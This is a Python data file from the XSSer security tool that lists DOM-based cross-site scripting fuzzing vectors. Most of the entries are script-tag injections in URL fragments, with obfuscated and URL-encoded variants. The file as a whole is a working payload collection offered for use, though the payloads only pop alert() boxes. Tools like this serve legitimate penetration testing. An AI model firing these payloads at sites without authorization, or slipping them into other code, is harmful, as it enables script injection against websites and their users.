#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
This file is part of the XSSer project, https://xsser.03c8.net

Copyright (c) 2010/2020 | psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
## This file contains different XSS fuzzing vectors.
## If you have some new, please email me to [epsylon@riseup.net]
## Happy Cross Hacking! ;)

DOMvectors = [
#		{ 'payload' : """?notname=PAYLOAD&""",
#		  'browser' : """[Document Object Model Injection]"""},
#		{ 'payload':'''<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="PAYLOAD" style="behavior:url(#x);"><param name=postdomevents /></object>''',
#		  'browser' : """[Document Object Model Injection]"""},
#		{ 'payload' : """?<script>history.pushState(0,0,'PAYLOAD');</script>""",
#		  'browser' : """[Document Object Model Injection]"""},
#		{ 'payload' : """?name=Y%0d%0a%0d%0aPAYLOAD""",
#		  'browser' : """[Document Object Model Injection]"""}, 
#		{ 'payload' : """?foobar=name=PAYLOAD&""",
#		  'browser' : """[Document Object Model Injection]"""},
		{ 'payload':"""Y#<script>alert('PAYLOAD')</script>""",
		  'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<%<!--'%><script>alert(PAYLOAD);</script -->""",
          'browser':"""[Document Object Model Injection]"""},			
        { 'payload':"""Y#<script ^__^>alert(PAYLOAD)</script ^__^""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#<script src="data:text/javascript,alert(PAYLOAD)"></script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<script>+-+-1-+-+alert(PAYLOAD)</script>""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<script x> alert(PAYLOAD) </script 1=2""",
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#<script>a=eval;b=alert;a(b(/ PAYLOAD/.source));</script>'">''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#<script/y~~~>;alert(PAYLOAD);</script/Y~~~>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%00“><script>alert(PAYLOAD)</script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%22%3E%3Cscript%3Ealert(PAYLOAD)%3B%3C%2Fscript%3E''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%3Cscript%3Ealert(PAYLOAD)%3B%3C%2Fscript%3E''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#`"><%3Cscript>javascript:alert(PAYLOAD)</script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':'''Y#%3Cscript>javascript:alert(PAYLOAD)</script>''',
          'browser':"""[Document Object Model Injection]"""},
        { 'payload':"""Y#<SCRIPT>a=/PAYLOAD/alert(a.source)</SCRIPT>""",
          'browser':"""[Document Object Model Injection]"""}
		]
